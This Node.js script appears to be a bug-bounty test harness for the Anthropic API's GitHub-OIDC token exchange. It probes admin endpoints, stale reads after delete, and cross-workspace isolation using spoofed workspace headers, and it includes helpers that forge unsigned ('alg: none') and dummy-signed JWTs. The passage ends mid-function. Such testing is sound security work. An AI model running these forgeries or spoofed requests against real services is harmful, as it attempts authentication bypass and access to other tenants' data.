#!/usr/bin/env node

import { mkdir, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";

const BASE_URL = process.env.ANTHROPIC_BASE_URL || "https://api.anthropic.com";
const VERSION = process.env.ANTHROPIC_VERSION || "2023-06-01";
const AUDIENCE = process.env.INPUT_AUDIENCE || "https://api.anthropic.com";
const EXPERIMENT = process.env.INPUT_EXPERIMENT || "legacy_suite";
const OUT_DIR = "evidence";
const FILES_BETA = process.env.ANTHROPIC_FILES_BETA || "files-api-2025-04-14";
const MESSAGE_BATCHES_BETA = process.env.ANTHROPIC_MESSAGE_BATCHES_BETA || "";

function sha256(value) {
  return createHash("sha256").update(String(value)).digest("hex");
}

function b64urlJson(value) {
  return Buffer.from(JSON.stringify(value))
    .toString("base64")
    .replaceAll("+", "-")
    .replaceAll("/", "_")
    .replaceAll("=", "");
}

function b64urlDecode(part) {
  const padded = `${part}${"=".repeat((4 - (part.length % 4)) % 4)}`;
  return Buffer.from(padded.replaceAll("-", "+").replaceAll("_", "/"), "base64").toString("utf8");
}

function decodeJwt(jwt) {
  const [headerPart, payloadPart, signaturePart = ""] = jwt.split(".");
  return {
    header: JSON.parse(b64urlDecode(headerPart)),
    payload: JSON.parse(b64urlDecode(payloadPart)),
    signature_sha256: sha256(signaturePart),
    signature_length: signaturePart.length,
  };
}

function safeClaimsFromDecoded(decoded) {
  return {
    iss: decoded.payload.iss,
    aud: decoded.payload.aud,
    sub: decoded.payload.sub,
    repository: decoded.payload.repository,
    repository_owner: decoded.payload.repository_owner,
    repository_id: decoded.payload.repository_id,
    repository_owner_id: decoded.payload.repository_owner_id,
    ref: decoded.payload.ref,
    ref_type: decoded.payload.ref_type,
    sha: decoded.payload.sha,
    workflow: decoded.payload.workflow,
    workflow_ref: decoded.payload.workflow_ref,
    job_workflow_ref: decoded.payload.job_workflow_ref,
    event_name: decoded.payload.event_name,
    actor: decoded.payload.actor,
    actor_id: decoded.payload.actor_id,
    run_id: decoded.payload.run_id,
    run_attempt: decoded.payload.run_attempt,
  };
}

function sanitizeString(value) {
  if (typeof value !== "string") return value ?? null;
  return value
    .replace(/sk-ant-[A-Za-z0-9._-]+/g, "[redacted:anthropic-token]")
    .replace(/Bearer\s+[A-Za-z0-9._~+/=-]+/gi, "Bearer [redacted]")
    .replace(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g, "[redacted:jwt]")
    .replace(/\b(file|msgbatch|msg|wrkspc|org|user|api_key)_[A-Za-z0-9_-]+\b/g, "[redacted:anthropic-id]");
}

function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value).map(([key, child]) => {
        if (/access_token|refresh_token|authorization|api[-_]?key|secret|token|assertion/i.test(key)) {
          return [key, "[redacted:sensitive-field]"];
        }
        return [key, redact(child)];
      }),
    );
  }
  if (typeof value === "string") return sanitizeString(value);
  return value;
}

async function getGithubOidc(audience) {
  const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!requestUrl || !requestToken) {
    throw new Error("GitHub OIDC environment variables are missing. Check id-token: write permission.");
  }
  const url = new URL(requestUrl);
  url.searchParams.set("audience", audience);
  const res = await fetch(url, {
    headers: {
      authorization: `Bearer ${requestToken}`,
      accept: "application/json",
    },
  });
  const body = await res.json();
  if (!res.ok || typeof body.value !== "string") {
    throw new Error(`GitHub OIDC request failed: ${res.status} ${JSON.stringify(redact(body))}`);
  }
  return body.value;
}

async function parseJsonResponse(res) {
  const text = await res.text();
  const contentType = res.headers.get("content-type") || "";
  let parsed = text;
  if (contentType.includes("json")) {
    try {
      parsed = text ? JSON.parse(text) : null;
    } catch {
      parsed = text;
    }
  }
  return { text, contentType, parsed };
}


function maybeBeta(value) {
  return value ? { "anthropic-beta": value } : {};
}

function authHeaders(accessToken, extra = {}) {
  return {
    "anthropic-version": VERSION,
    authorization: `Bearer ${accessToken}`,
    "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    ...extra,
  };
}

function apiKeyHeaders(apiKey, extra = {}) {
  return {
    "anthropic-version": VERSION,
    "x-api-key": apiKey,
    "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    ...extra,
  };
}

function compactHttpResult(res, parsedResponse, successBody = "[success body omitted]") {
  return {
    status: res.status,
    ok: res.ok,
    content_type: parsedResponse.contentType,
    body_sha256: sha256(parsedResponse.text),
    error_type: sanitizeString(parsedResponse.parsed?.error?.type ?? parsedResponse.parsed?.error ?? null),
    error_message: sanitizeString(parsedResponse.parsed?.error?.message ?? null),
    body_preview: res.ok ? successBody : redact(parsedResponse.parsed),
  };
}

async function exchange(label, assertion, overrides = {}) {
  const body = {
    grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
    assertion,
    organization_id: process.env.ANTHROPIC_ORGANIZATION_ID,
    workspace_id: process.env.ANTHROPIC_WORKSPACE_ID,
    federation_rule_id: process.env.ANTHROPIC_FEDERATION_RULE_ID,
    service_account_id: process.env.ANTHROPIC_SERVICE_ACCOUNT_ID,
    ...overrides,
  };

  const res = await fetch(`${BASE_URL}/v1/oauth/token`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify(body),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  const result = {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    access_token_returned: typeof parsed?.access_token === "string",
    access_token_sha256: typeof parsed?.access_token === "string" ? sha256(parsed.access_token) : null,
    token_type: parsed?.token_type ?? null,
    expires_in: parsed?.expires_in ?? null,
    error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
    error_message: sanitizeString(parsed?.error?.message ?? parsed?.error_description ?? null),
    body_preview: redact(parsed),
  };
  if (typeof parsed?.access_token === "string") {
    Object.defineProperty(result, "_accessTokenForSmokeOnly", {
      value: parsed.access_token,
      enumerable: false,
    });
  }
  return result;
}

async function adminSmoke(label, accessToken) {
  const endpoints = [
    ["workspaces", "/v1/organizations/workspaces"],
    ["users", "/v1/organizations/users"],
    ["invites", "/v1/organizations/invites"],
    ["api_keys", "/v1/organizations/api_keys"],
    ["usage_report_messages", "/v1/organizations/usage_report/messages"],
  ];
  const authModes = [
    ["bearer", { authorization: `Bearer ${accessToken}` }],
    ["x_api_key", { "x-api-key": accessToken }],
    ["dual_bearer_and_x_api_key", { authorization: `Bearer ${accessToken}`, "x-api-key": accessToken }],
  ];
  const results = [];
  for (const [auth_mode, authHeadersForMode] of authModes) {
    for (const [name, path] of endpoints) {
      const res = await fetch(`${BASE_URL}${path}`, {
        method: "GET",
        headers: {
          "anthropic-version": VERSION,
          "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
          ...authHeadersForMode,
        },
      });
      const { text, contentType, parsed } = await parseJsonResponse(res);
      results.push({
        auth_mode,
        name,
        path,
        status: res.status,
        ok: res.ok,
        content_type: contentType,
        body_sha256: sha256(text),
        error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
        error_message: sanitizeString(parsed?.error?.message ?? null),
        body_preview: res.ok ? "[success body omitted]" : redact(parsed),
      });
    }
  }
  return {
    label,
    any_admin_endpoint_ok: results.some((item) => item.ok),
    results,
  };
}

async function messageSmoke(label, accessToken) {
  const res = await fetch(`${BASE_URL}/v1/messages`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      authorization: `Bearer ${accessToken}`,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify({
      model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
      max_tokens: 1,
      messages: [{ role: "user", content: "Reply OK." }],
    }),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  return {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    message_id: typeof parsed?.id === "string" ? parsed.id : null,
    error_type: sanitizeString(parsed?.error?.type ?? parsed?.error ?? null),
    error_message: sanitizeString(parsed?.error?.message ?? null),
    body_preview: res.ok ? "[success body omitted]" : redact(parsed),
  };
}


async function fileSmoke(label, accessToken) {
  const form = new FormData();
  form.set("purpose", "user_data");
  form.set(
    "file",
    new Blob([`h1 owned file smoke ${new Date().toISOString()}\n`], { type: "text/plain" }),
    "h1-owned-file-smoke.txt",
  );
  const createRes = await fetch(`${BASE_URL}/v1/files`, {
    method: "POST",
    headers: authHeaders(accessToken, maybeBeta(FILES_BETA)),
    body: form,
  });
  const createParsed = await parseJsonResponse(createRes);
  const fileId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;

  let retrieve = null;
  if (fileId) {
    const retrieveRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
      method: "GET",
      headers: authHeaders(accessToken, maybeBeta(FILES_BETA)),
    });
    retrieve = compactHttpResult(retrieveRes, await parseJsonResponse(retrieveRes));
  }

  let cleanup = null;
  if (fileId) {
    const deleteRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
      method: "DELETE",
      headers: authHeaders(accessToken, maybeBeta(FILES_BETA)),
    });
    cleanup = compactHttpResult(deleteRes, await parseJsonResponse(deleteRes));
  }

  return {
    label,
    create: {
      ...compactHttpResult(createRes, createParsed),
      file_id_returned: Boolean(fileId),
      file_id_sha256: fileId ? sha256(fileId) : null,
    },
    retrieve,
    cleanup,
  };
}

async function batchSmoke(label, accessToken) {
  const customId = `h1-owned-batch-smoke-${Date.now()}`;
  const createRes = await fetch(`${BASE_URL}/v1/messages/batches`, {
    method: "POST",
    headers: authHeaders(accessToken, {
      "content-type": "application/json",
      ...maybeBeta(MESSAGE_BATCHES_BETA),
    }),
    body: JSON.stringify({
      requests: [
        {
          custom_id: customId,
          params: {
            model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
            max_tokens: 1,
            messages: [{ role: "user", content: "Reply OK." }],
          },
        },
      ],
    }),
  });
  const createParsed = await parseJsonResponse(createRes);
  const batchId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;

  let retrieve = null;
  if (batchId) {
    const retrieveRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
      method: "GET",
      headers: authHeaders(accessToken, maybeBeta(MESSAGE_BATCHES_BETA)),
    });
    retrieve = compactHttpResult(retrieveRes, await parseJsonResponse(retrieveRes));
  }

  let cancel = null;
  if (batchId) {
    const cancelRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}/cancel`, {
      method: "POST",
      headers: authHeaders(accessToken, maybeBeta(MESSAGE_BATCHES_BETA)),
    });
    cancel = compactHttpResult(cancelRes, await parseJsonResponse(cancelRes));
  }

  return {
    label,
    create: {
      ...compactHttpResult(createRes, createParsed),
      batch_id_returned: Boolean(batchId),
      batch_id_sha256: batchId ? sha256(batchId) : null,
    },
    retrieve,
    cancel,
  };
}


async function getFileMetadata(accessToken, fileId, extraHeaders = {}) {
  const res = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
    method: "GET",
    headers: authHeaders(accessToken, { ...maybeBeta(FILES_BETA), ...extraHeaders }),
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function getFileContent(accessToken, fileId, extraHeaders = {}) {
  const res = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}/content`, {
    method: "GET",
    headers: authHeaders(accessToken, { ...maybeBeta(FILES_BETA), ...extraHeaders }),
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function getFileMetadataWithHeaders(fileId, headers) {
  const res = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
    method: "GET",
    headers,
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function getFileContentMarkerWithHeaders(fileId, headers, marker) {
  const res = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}/content`, {
    method: "GET",
    headers,
  });
  const parsedResponse = await parseJsonResponse(res);
  const text = parsedResponse.text;
  return {
    ...compactHttpResult(res, parsedResponse),
    marker_sha256: sha256(marker),
    marker_present_in_body: Boolean(res.ok && text.includes(marker)),
  };
}

async function fileLifecycleSmoke(label, accessToken) {
  const marker = `H1_WIF_FILE_TOMBSTONE_${Date.now()}`;
  const form = new FormData();
  form.set("purpose", "user_data");
  form.set("file", new Blob([`${marker}\n`], { type: "text/plain" }), "h1-file-lifecycle.txt");

  const createRes = await fetch(`${BASE_URL}/v1/files`, {
    method: "POST",
    headers: authHeaders(accessToken, maybeBeta(FILES_BETA)),
    body: form,
  });
  const createParsed = await parseJsonResponse(createRes);
  const fileId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
  const result = {
    label,
    marker_sha256: sha256(marker),
    create: {
      ...compactHttpResult(createRes, createParsed),
      file_id_returned: Boolean(fileId),
      file_id_sha256: fileId ? sha256(fileId) : null,
    },
    pre_delete_metadata: null,
    pre_delete_content: null,
    delete: null,
    post_delete_metadata: null,
    post_delete_content: null,
    wrong_beta_metadata: null,
    no_beta_metadata: null,
    candidate_stale_read: false,
  };
  if (!fileId) return result;

  result.pre_delete_metadata = await getFileMetadata(accessToken, fileId);
  result.pre_delete_content = await getFileContent(accessToken, fileId);

  const wrongBetaRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
    method: "GET",
    headers: authHeaders(accessToken, { "anthropic-beta": "message-batches-2024-09-24" }),
  });
  result.wrong_beta_metadata = compactHttpResult(wrongBetaRes, await parseJsonResponse(wrongBetaRes));

  const noBetaRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
    method: "GET",
    headers: authHeaders(accessToken),
  });
  result.no_beta_metadata = compactHttpResult(noBetaRes, await parseJsonResponse(noBetaRes));

  const deleteRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
    method: "DELETE",
    headers: authHeaders(accessToken, maybeBeta(FILES_BETA)),
  });
  result.delete = compactHttpResult(deleteRes, await parseJsonResponse(deleteRes));
  result.post_delete_metadata = await getFileMetadata(accessToken, fileId);
  result.post_delete_content = await getFileContent(accessToken, fileId);
  result.candidate_stale_read = Boolean(result.post_delete_metadata?.ok || result.post_delete_content?.ok);
  return result;
}


async function getBatchMetadata(accessToken, batchId, extraHeaders = {}) {
  const res = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
    method: "GET",
    headers: authHeaders(accessToken, { ...maybeBeta(MESSAGE_BATCHES_BETA), ...extraHeaders }),
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function getBatchMetadataWithHeaders(batchId, headers) {
  const res = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
    method: "GET",
    headers,
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function getBatchResults(accessToken, batchId, extraHeaders = {}) {
  const res = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}/results`, {
    method: "GET",
    headers: authHeaders(accessToken, { ...maybeBeta(MESSAGE_BATCHES_BETA), ...extraHeaders }),
  });
  return compactHttpResult(res, await parseJsonResponse(res));
}

async function batchLifecycleSmoke(label, accessToken) {
  const marker = `H1_WIF_BATCH_TOMBSTONE_${Date.now()}`;
  const customId = `h1-batch-lifecycle-${Date.now()}`;
  const createRes = await fetch(`${BASE_URL}/v1/messages/batches`, {
    method: "POST",
    headers: authHeaders(accessToken, { "content-type": "application/json", ...maybeBeta(MESSAGE_BATCHES_BETA) }),
    body: JSON.stringify({
      requests: [{
        custom_id: customId,
        params: {
          model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
          max_tokens: 8,
          messages: [{ role: "user", content: `Reply exactly: ${marker}` }],
        },
      }],
    }),
  });
  const createParsed = await parseJsonResponse(createRes);
  const batchId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
  const result = {
    label,
    marker_sha256: sha256(marker),
    custom_id_sha256: sha256(customId),
    create: {
      ...compactHttpResult(createRes, createParsed),
      batch_id_returned: Boolean(batchId),
      batch_id_sha256: batchId ? sha256(batchId) : null,
    },
    pre_cancel_metadata: null,
    pre_cancel_results: null,
    cancel: null,
    post_cancel_metadata: null,
    post_cancel_results: null,
    wrong_beta_metadata: null,
    no_beta_metadata: null,
    candidate_unexpected_results_access: false,
  };
  if (!batchId) return result;

  result.pre_cancel_metadata = await getBatchMetadata(accessToken, batchId);
  result.pre_cancel_results = await getBatchResults(accessToken, batchId);

  const wrongBetaRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
    method: "GET",
    headers: authHeaders(accessToken, { "anthropic-beta": "files-api-2025-04-14" }),
  });
  result.wrong_beta_metadata = compactHttpResult(wrongBetaRes, await parseJsonResponse(wrongBetaRes));

  const noBetaRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
    method: "GET",
    headers: authHeaders(accessToken),
  });
  result.no_beta_metadata = compactHttpResult(noBetaRes, await parseJsonResponse(noBetaRes));

  const cancelRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}/cancel`, {
    method: "POST",
    headers: authHeaders(accessToken, maybeBeta(MESSAGE_BATCHES_BETA)),
  });
  result.cancel = compactHttpResult(cancelRes, await parseJsonResponse(cancelRes));
  result.post_cancel_metadata = await getBatchMetadata(accessToken, batchId);
  result.post_cancel_results = await getBatchResults(accessToken, batchId);
  result.candidate_unexpected_results_access = Boolean(result.post_cancel_results?.ok);
  return result;
}

async function wifTokenVsApiKeyBObjectIsolation(label, accessTokenA) {
  const apiKeyB = process.env.ANTHROPIC_API_KEY_B;
  const result = {
    label,
    status: apiKeyB ? "attempted" : "skipped_missing_anthropic_api_key_b_secret",
    b_workspace_header_fingerprint: {
      organization_id_sha256: process.env.ANTHROPIC_ORGANIZATION_ID ? sha256(process.env.ANTHROPIC_ORGANIZATION_ID) : null,
      workspace_id_sha256: process.env.ANTHROPIC_B_WORKSPACE_ID ? sha256(process.env.ANTHROPIC_B_WORKSPACE_ID) : null,
    },
    file: null,
    batch: null,
  };
  if (!apiKeyB) return result;

  const bSpoofHeaders = {
    "anthropic-workspace-id": process.env.ANTHROPIC_B_WORKSPACE_ID || "",
    "x-organization-uuid": process.env.ANTHROPIC_ORGANIZATION_ID || "",
  };
  const marker = `H1_WIF_A_MUST_NOT_READ_B_FILE_${Date.now()}`;
  let fileId = null;
  try {
    const form = new FormData();
    form.set("purpose", "user_data");
    form.set("file", new Blob([`${marker}\n`], { type: "text/plain" }), "h1-wif-cross-b-file.txt");
    const createRes = await fetch(`${BASE_URL}/v1/files`, {
      method: "POST",
      headers: apiKeyHeaders(apiKeyB, maybeBeta(FILES_BETA)),
      body: form,
    });
    const createParsed = await parseJsonResponse(createRes);
    fileId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
    result.file = {
      marker_sha256: sha256(marker),
      create_with_b_api_key: {
        ...compactHttpResult(createRes, createParsed),
        file_id_returned: Boolean(fileId),
        file_id_sha256: fileId ? sha256(fileId) : null,
      },
      owner_b_metadata: fileId
        ? await getFileMetadataWithHeaders(fileId, apiKeyHeaders(apiKeyB, maybeBeta(FILES_BETA)))
        : null,
      owner_b_content: fileId
        ? await getFileContentMarkerWithHeaders(fileId, apiKeyHeaders(apiKeyB, maybeBeta(FILES_BETA)), marker)
        : null,
      cross_a_wif_metadata: fileId
        ? await getFileMetadataWithHeaders(fileId, authHeaders(accessTokenA, maybeBeta(FILES_BETA)))
        : null,
      cross_a_wif_content: fileId
        ? await getFileContentMarkerWithHeaders(fileId, authHeaders(accessTokenA, maybeBeta(FILES_BETA)), marker)
        : null,
      cross_a_wif_with_b_workspace_headers_metadata: fileId
        ? await getFileMetadataWithHeaders(
            fileId,
            authHeaders(accessTokenA, { ...maybeBeta(FILES_BETA), ...bSpoofHeaders }),
          )
        : null,
      cross_a_wif_with_b_workspace_headers_content: fileId
        ? await getFileContentMarkerWithHeaders(
            fileId,
            authHeaders(accessTokenA, { ...maybeBeta(FILES_BETA), ...bSpoofHeaders }),
            marker,
          )
        : null,
      cleanup_b_api_key: null,
    };
  } finally {
    if (fileId && result.file) {
      const deleteRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
        method: "DELETE",
        headers: apiKeyHeaders(apiKeyB, maybeBeta(FILES_BETA)),
      });
      result.file.cleanup_b_api_key = compactHttpResult(deleteRes, await parseJsonResponse(deleteRes));
    }
  }

  let batchId = null;
  try {
    const customId = `h1-wif-cross-b-batch-${Date.now()}`;
    const createRes = await fetch(`${BASE_URL}/v1/messages/batches`, {
      method: "POST",
      headers: apiKeyHeaders(apiKeyB, { "content-type": "application/json", ...maybeBeta(MESSAGE_BATCHES_BETA) }),
      body: JSON.stringify({
        requests: [{
          custom_id: customId,
          params: {
            model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
            max_tokens: 1,
            messages: [{ role: "user", content: "Reply OK." }],
          },
        }],
      }),
    });
    const createParsed = await parseJsonResponse(createRes);
    batchId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
    result.batch = {
      custom_id_sha256: sha256(customId),
      create_with_b_api_key: {
        ...compactHttpResult(createRes, createParsed),
        batch_id_returned: Boolean(batchId),
        batch_id_sha256: batchId ? sha256(batchId) : null,
      },
      owner_b_metadata: batchId
        ? await getBatchMetadataWithHeaders(batchId, apiKeyHeaders(apiKeyB, maybeBeta(MESSAGE_BATCHES_BETA)))
        : null,
      cross_a_wif_metadata: batchId ? await getBatchMetadata(accessTokenA, batchId) : null,
      cross_a_wif_with_b_workspace_headers_metadata: batchId
        ? await getBatchMetadata(accessTokenA, batchId, bSpoofHeaders)
        : null,
      cleanup_b_api_key: null,
    };
  } finally {
    if (batchId && result.batch) {
      const cancelRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}/cancel`, {
        method: "POST",
        headers: apiKeyHeaders(apiKeyB, maybeBeta(MESSAGE_BATCHES_BETA)),
      });
      result.batch.cleanup_b_api_key = compactHttpResult(cancelRes, await parseJsonResponse(cancelRes));
    }
  }

  const fileForbiddenRead = Boolean(
    result.file?.cross_a_wif_content?.marker_present_in_body ||
      result.file?.cross_a_wif_with_b_workspace_headers_content?.marker_present_in_body,
  );
  const batchForbiddenRead = Boolean(
    result.batch?.cross_a_wif_metadata?.ok || result.batch?.cross_a_wif_with_b_workspace_headers_metadata?.ok,
  );
  result.status = fileForbiddenRead || batchForbiddenRead
    ? "candidate_high_wif_a_token_can_access_api_key_b_object"
    : "wif_a_token_blocked_from_api_key_b_objects";
  return result;
}

async function crossWorkspaceObjectIsolation(label, jwt, accessTokenA) {
  const bCredential = optionalBExchangeVars();
  const result = {
    label,
    status: bCredential.missing.length ? "skipped_missing_b_credential" : "attempted",
    missing_b_variables: bCredential.missing,
    b_request_body_fingerprint: bCredential.missing.length ? null : fingerprintExchangeOverrides(bCredential.overrides),
    b_github_oidc: null,
    b_exchange: null,
    file: null,
    batch: null,
  };
  if (bCredential.missing.length) return result;

  const bJwt = await getGithubOidc(AUDIENCE);
  const bDecoded = decodeJwt(bJwt);
  result.b_github_oidc = {
    note: "Fresh GitHub OIDC JWT used for the B exchange so workspace-object isolation is not confused with JTI replay protection.",
    requested_audience: AUDIENCE,
    jwt_sha256_only: sha256(bJwt),
    safe_claims: safeClaimsFromDecoded(bDecoded),
  };
  const bExchange = await exchange("cross-workspace-b-token", bJwt, bCredential.overrides);
  result.b_exchange = bExchange;
  if (typeof bExchange._accessTokenForSmokeOnly !== "string") {
    result.status = "b_token_not_minted";
    return result;
  }
  const accessTokenB = bExchange._accessTokenForSmokeOnly;

  let fileId = null;
  try {
    const form = new FormData();
    form.set("purpose", "user_data");
    form.set("file", new Blob([`h1 cross workspace file ${new Date().toISOString()}\n`], { type: "text/plain" }), "h1-cross-workspace-a.txt");
    const createRes = await fetch(`${BASE_URL}/v1/files`, {
      method: "POST",
      headers: authHeaders(accessTokenA, maybeBeta(FILES_BETA)),
      body: form,
    });
    const createParsed = await parseJsonResponse(createRes);
    fileId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
    result.file = {
      create_a: {
        ...compactHttpResult(createRes, createParsed),
        file_id_returned: Boolean(fileId),
        file_id_sha256: fileId ? sha256(fileId) : null,
      },
      retrieve_with_b: fileId ? await getFileMetadata(accessTokenB, fileId) : null,
      cleanup_a: null,
    };
  } finally {
    if (fileId) {
      const deleteRes = await fetch(`${BASE_URL}/v1/files/${encodeURIComponent(fileId)}`, {
        method: "DELETE",
        headers: authHeaders(accessTokenA, maybeBeta(FILES_BETA)),
      });
      result.file.cleanup_a = compactHttpResult(deleteRes, await parseJsonResponse(deleteRes));
    }
  }

  let batchId = null;
  try {
    const customId = `h1-cross-workspace-batch-${Date.now()}`;
    const createRes = await fetch(`${BASE_URL}/v1/messages/batches`, {
      method: "POST",
      headers: authHeaders(accessTokenA, { "content-type": "application/json", ...maybeBeta(MESSAGE_BATCHES_BETA) }),
      body: JSON.stringify({
        requests: [{
          custom_id: customId,
          params: {
            model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
            max_tokens: 1,
            messages: [{ role: "user", content: "Reply OK." }],
          },
        }],
      }),
    });
    const createParsed = await parseJsonResponse(createRes);
    batchId = typeof createParsed.parsed?.id === "string" ? createParsed.parsed.id : null;
    let bRetrieve = null;
    if (batchId) {
      const bRetrieveRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}`, {
        method: "GET",
        headers: authHeaders(accessTokenB, maybeBeta(MESSAGE_BATCHES_BETA)),
      });
      bRetrieve = compactHttpResult(bRetrieveRes, await parseJsonResponse(bRetrieveRes));
    }
    result.batch = {
      create_a: {
        ...compactHttpResult(createRes, createParsed),
        batch_id_returned: Boolean(batchId),
        batch_id_sha256: batchId ? sha256(batchId) : null,
      },
      retrieve_with_b: bRetrieve,
      cleanup_a: null,
    };
  } finally {
    if (batchId) {
      const cancelRes = await fetch(`${BASE_URL}/v1/messages/batches/${encodeURIComponent(batchId)}/cancel`, {
        method: "POST",
        headers: authHeaders(accessTokenA, maybeBeta(MESSAGE_BATCHES_BETA)),
      });
      result.batch.cleanup_a = compactHttpResult(cancelRes, await parseJsonResponse(cancelRes));
    }
  }

  result.status = result.file?.retrieve_with_b?.ok || result.batch?.retrieve_with_b?.ok
    ? "candidate_cross_workspace_object_read"
    : "cross_workspace_object_reads_blocked";
  return result;
}

function unsignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "none", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.`;
}

function dummySignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "HS256", kid: "h1-dummy", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.${Buffer.from("dummy-signature").toString("base64url")}`;
}

function requireExchangeVars() {
  const required = [
    "ANTHROPIC_ORGANIZATION_ID",
    "ANTHROPIC_WORKSPACE_ID",
    "ANTHROPIC_FEDERATION_RULE_ID",
    "ANTHROPIC_SERVICE_ACCOUNT_ID",
  ];
  return required.filter((name) => !process.env[name]);
}


function optionalBExchangeVars() {
  const envToBody = {
    ANTHROPIC_B_ORGANIZATION_ID: "organization_id",
    ANTHROPIC_B_WORKSPACE_ID: "workspace_id",
    ANTHROPIC_B_FEDERATION_RULE_ID: "federation_rule_id",
    ANTHROPIC_B_SERVICE_ACCOUNT_ID: "service_account_id",
  };
  const missing = Object.keys(envToBody).filter((name) => !process.env[name]);
  const overrides = Object.fromEntries(
    Object.entries(envToBody).map(([envName, bodyName]) => [bodyName, process.env[envName]]),
  );
  return { missing, overrides };
}

function fingerprintExchangeOverrides(overrides = {}) {
  const keys = ["organization_id", "workspace_id", "federation_rule_id", "service_account_id"];
  return Object.fromEntries(
    keys.map((key) => [
      `${key}_sha256`,
      typeof overrides[key] === "string" ? sha256(overrides[key]) : null,
    ]),
  );
}

function variantForExperiment(name) {
  const dummy = {
    dummy_workspace_id: "wrkspc_01H1DummyWorkspaceBoundaryTest0000",
    dummy_service_account_id: "svac_01H1DummyServiceAccountTest0000",
    dummy_federation_rule_id: "fdrl_01H1DummyFederationRuleTest0000",
    dummy_organization_id: "00000000-0000-4000-8000-000000000001",
  };
  const variants = {
    alt_workspace_id: ["workspace_id", process.env.ANTHROPIC_ALT_WORKSPACE_ID],
    alt_service_account_id: ["service_account_id", process.env.ANTHROPIC_ALT_SERVICE_ACCOUNT_ID],
    alt_federation_rule_id: ["federation_rule_id", process.env.ANTHROPIC_ALT_FEDERATION_RULE_ID],
    alt_rule_and_alt_service_account: [
      ["federation_rule_id", process.env.ANTHROPIC_ALT_FEDERATION_RULE_ID],
      ["service_account_id", process.env.ANTHROPIC_ALT_SERVICE_ACCOUNT_ID],
    ],
    alt_organization_id: ["organization_id", process.env.ANTHROPIC_ALT_ORGANIZATION_ID],
    dummy_workspace_id: ["workspace_id", dummy.dummy_workspace_id],
    dummy_service_account_id: ["service_account_id", dummy.dummy_service_account_id],
    dummy_federation_rule_id: ["federation_rule_id", dummy.dummy_federation_rule_id],
    dummy_organization_id: ["organization_id", dummy.dummy_organization_id],
  };
